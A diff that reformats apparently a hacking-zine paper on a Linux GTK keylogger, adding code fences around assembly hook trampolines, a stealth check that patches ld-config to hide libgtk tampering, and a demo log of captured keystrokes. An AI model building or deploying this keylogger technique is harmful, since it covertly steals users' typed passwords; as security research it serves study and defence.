@@ -107,11 +107,8 @@ Here a table differentiating the kind of keyloggers we can use.
  Type           | Support           | Data             | Scope            |
 ----------------|-------------------|------------------|------------------|
 Evdev keylogger | Completely generic| Catches keycodes | Keyboard events  |
-----------------|-------------------|------------------|------------------|
 LKM keylogger   | Semi generic      | Catches keycodes | All input events |
-----------------|-------------------|------------------|------------------|
 GTK keylogger   | Not generic       | Seen on GUI      | All using GTK    |
-----------------|-------------------|------------------|------------------|
 
 
 --[ 3. How the GTK keylogger works
@@ -208,12 +205,13 @@ that instruction with a mov of the next address of the call.
 
 The rest calls are rebuilded with a trick in ASM:
 
+```
 jmp _call
 _push:
   push $addr_of__call
   ret
 _call: call _push
-
+```
 
 As maybe you know, in x86_64 there're a difference from x86 when speaking
 about pointing in code, which is called RIP relative addressing. That was
@@ -229,6 +227,7 @@ the x86 machine code of Linux.
 Here you have a disassembly of some of the places we hook, in x86, with the
 explained technique, and following the solution:
 
+```
 (gdb) disas gtk_im_multicontext_new
 Dump of assembler code for function IA__gtk_im_multicontext_new:
    0x00109d10 <+0>: push   %ebx
@@ -253,17 +252,19 @@ snprintf(asm_code,
 printf("%s\n", asm_code);
 
 asm_opcodes = Assemble(asm_code, &opcodes_sz);
-
+```
 
 --[ 3.3.2 The hook in x64
 
 Patch of the routine to hook:
 
+```
 push rax
 mov rax, ADDR_hook_entry
 jmp rax
 pop rax <-- ADDR return from
 trampoline
+```
 
 The push rax it's used to keep the value of the rax, after the use of this
 in the jmp to the hook entry.  The pop rax it's executed after the jmp from
@@ -274,6 +275,7 @@ The hook entry:
 When we do pop rax and after a push of all the registers, we keep the rax.
 And all the registers.
 
+```
 pop rax
 pushfq
 push REGISTERS
@@ -281,15 +283,17 @@ call handler_in_C
 pop REGISTERS
 popfq jmpq
 TRAMPOLINE_ADDRESS
+```
 
 The trampoline in x64 rebuilds the lead, mov and push rip-relative.  And
 has the following structure:
 
+```
 repaired_opcodes
 push rax
 mov rax, ADDR_return_from_trampoline
 jmp rax
-
+```
 
 --[ 3.4 Infection
 
@@ -322,12 +326,13 @@ that something is wrong.
 The solution is to patch ld-config, hook the function that advises, and do
 a simple logic:
 
+```
 if (strcmp(library, "libgtk*") == 0) {
 	// nothing to do :)
 } else {
 	// advise
 }
-
+```
 
 --[ 4. Given support
 
@@ -356,58 +361,15 @@ The virtual keyboard (florence) is logged also.
 
 --[ 5. How-to test the GTK Keylogger
 
-Extract from this paper, the compressed release and extract the release
-also.
+First of all install it as root, by issuing the `install` script.
 
-You should see a directory tree as the following:
-
-drwxr-xr-x 11 diwou staff  352 Oct  4 12:55 .  drwxr-xr-x 68 diwou staff
-2176 Oct  4 12:58 ..  -rw-r--r--  1 diwou staff 6148 Apr 17 12:59 .DS_Store
--rw-r--r--  1 diwou staff  689 Apr 17 13:00 Makefile.x64 -rw-r--r--  1
-diwou staff  701 Apr 17 13:11 Makefile.x86 drwxr-xr-x  8 diwou staff  256
-Apr 17 13:03 deps drwxr-xr-x  5 diwou staff  160 Apr 17 13:00 doc
-drwxr-xr-x  7 diwou staff  224 Apr 17 13:00 include -rwxr-xr-x  1 diwou
-staff 6321 Apr 17 14:16 install drwxr-xr-x  9 diwou staff  288 Oct  4 13:02
-src -rwxr-xr-x  1 diwou staff 1384 Apr 17 13:00 uninstall
-
-On a one of the supported operating systems listed before, and with the
-supported libgtk installed, as root run the install script:
-
-root@diwou-VirtualBox:~/shared_folder/ubuntu-x86# ./install Detected Linux
-distribution is Ubuntu.  Installing deps ...  Leyendo lista de paquetes...
-Hecho Creando árbol de dependencias       Leyendo la información de
-estado... Hecho g++ ya está en su versión más reciente (4:5.3.1-1ubuntu1).
-gcc ya está en su versión más reciente (4:5.3.1-1ubuntu1).  make ya está en
-su versión más reciente (4.1-6).  cmake ya está en su versión más reciente
-(3.5.1-1ubuntu3).  0 actualizados, 0 nuevos se instalarán, 0 para eliminar
-y 391 no actualizados.  Please, enter a logging path [/tmp]: Compiling
-Keylogger ...  gcc -I./include -c src/hook_entries_x86.S -o
-src/hook_entries_x86.o
-# uncomment for dev mode
-#gcc -DKL_DEBUG -g -I./include -I./deps/capstone-3.0.5-rc2/include -Wall -o
-libksutil-1.so.0 -shared -fPIC -ldl src/keylogger_shared_library.c
-src/hook_entries_x86.o ./deps/capstone-3.0.5-rc2/libcapstone.a gcc
--I./include -I./deps/capstone-3.0.5-rc2/include -Wall -o libksutil-1.so.0
--shared -fPIC -ldl src/keylogger_shared_library.c src/hook_entries_x86.o
-./deps/capstone-3.0.5-rc2/libcapstone.a src/keylogger_shared_library.c: In
-function ‘HookGtkFunction’: src/keylogger_shared_library.c:1323:17:
-warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument
-5 has type ‘long unsigned int’ [-Wformat=] "mov %s, 0x%x", ^
-src/keylogger_shared_library.c:1323:17: warning: format ‘%x’ expects
-argument of type ‘unsigned int’, but argument 5 has type ‘long unsigned
-int’ [-Wformat=] g++ -o libasutil-1.so.0 src/kstool.cpp -Wall
--I./deps/keystone-0.9.1/include
-./deps/keystone-0.9.1/build/llvm/lib/libkeystone.a done!
-
--------
-
-Now the keylogger is installed.
-
-Open an instance of Firefox for example, or a new terminal and write.
+Once the keylogger is installed, open an instance of Firefox for example, or
+a new terminal and write.
 
 As you can see on the directory you choosed (/tmp for this case), there're
 new .txt files.
 
+```
 diwou@diwou-VirtualBox:~/shared_folder/ubuntu-x86$ ls /tmp
 config-err-gW7SKO
 firefox.2595.2595.method1.log
@@ -433,14 +395,15 @@ diwou@diwou-VirtualBox:~/shared_folder/ubuntu-x86$ od --width=10 -c
 0000050   a   s   s   w   o   r   d  \n
 0000060
 diwou@diwou-VirtualBox:~/shared_folder/ubuntu-x86$ 
-
+```
 
 To uninstall it just execute the uninstall script.
 
+```
 root@diwou-VirtualBox:~/shared_folder/ubuntu-x86# ./uninstall 
 Uninstalling keylogger ...
 done!
-
+```
 
 --[ 6. Greetings
 
@@ -450,24 +413,24 @@ give me his support.
 
 --[ 7. References
 
-[1] https://nixos.org/patchelf.html 
-[2] https://github.com/NixOS/patchelf
-[3] https://www.cs.cmu.edu/afs/cs.cmu.edu/academic/class/15213-f03/www/ftrace/elf.c
-[4] https://developer.gnome.org/gtk3/stable/gtk-building.html
-[5] https://github.com/GNOME/gtk/tree/master
-[6] https://developer.gnome.org/gtk3/stable/GtkIMContext.html#gtk-im-context-get-surrounding
-[7] https://developer.gnome.org/pygtk/stable/class-gtkimcontextsimple.html
-[8] https://developer.gnome.org/pygtk/stable/class-gtkimmulticontext.html
-[10] https://github.com/GNOME/gtk/tree/gtk-2-0
-[11] https://github.com/GNOME/gtk/blob/gtk-2-0/gtk/gtkimmulticontext.c
-[12] https://github.com/GNOME/gtk/blob/gtk-2-0/gtk/gtkimcontextsimple.c
-[13] https://github.com/GNOME/gtk/blob/gtk-3-0/gtk/gtkimmulticontext.c
-[14] http://www.linuxquestions.org/questions/debian-26/dpkg-buildpackage-passing-configure-options-351791/
-[15] https://github.com/kernc/logkeys 
-[16] http://www.securitybydefault.com/2013/09/listado-de-keyloggers-windows-linux.html
-[17] https://packetstormsecurity.com/files/87139/Nux-Keylogger-0.0.1.html
-[18] https://sourceforge.net/projects/lkl/ 
-[19] https://github.com/zacscott/zedlog 
-[20] http://resources.infosecinstitute.com/keylogger/ 
-[21] https://git.zx2c4.com/evdev-keylogger
-[22] https://github.com/David-Reguera-Garcia-Dreg/libuiohook/tree/master/src/x11
+[1] https://nixos.org/patchelf.html  
+[2] https://github.com/NixOS/patchelf  
+[3] https://www.cs.cmu.edu/afs/cs.cmu.edu/academic/class/15213-f03/www/ftrace/elf.c  
+[4] https://developer.gnome.org/gtk3/stable/gtk-building.html  
+[5] https://github.com/GNOME/gtk/tree/master  
+[6] https://developer.gnome.org/gtk3/stable/GtkIMContext.html#gtk-im-context-get-surrounding  
+[7] https://developer.gnome.org/pygtk/stable/class-gtkimcontextsimple.html  
+[8] https://developer.gnome.org/pygtk/stable/class-gtkimmulticontext.html  
+[10] https://github.com/GNOME/gtk/tree/gtk-2-0  
+[11] https://github.com/GNOME/gtk/blob/gtk-2-0/gtk/gtkimmulticontext.c  
+[12] https://github.com/GNOME/gtk/blob/gtk-2-0/gtk/gtkimcontextsimple.c  
+[13] https://github.com/GNOME/gtk/blob/gtk-3-0/gtk/gtkimmulticontext.c  
+[14] http://www.linuxquestions.org/questions/debian-26/dpkg-buildpackage-passing-configure-options-351791/  
+[15] https://github.com/kernc/logkeys  
+[16] http://www.securitybydefault.com/2013/09/listado-de-keyloggers-windows-linux.html  
+[17] https://packetstormsecurity.com/files/87139/Nux-Keylogger-0.0.1.html  
+[18] https://sourceforge.net/projects/lkl/  
+[19] https://github.com/zacscott/zedlog  
+[20] http://resources.infosecinstitute.com/keylogger/  
+[21] https://git.zx2c4.com/evdev-keylogger  
+[22] https://github.com/David-Reguera-Garcia-Dreg/libuiohook/tree/master/src/x11  
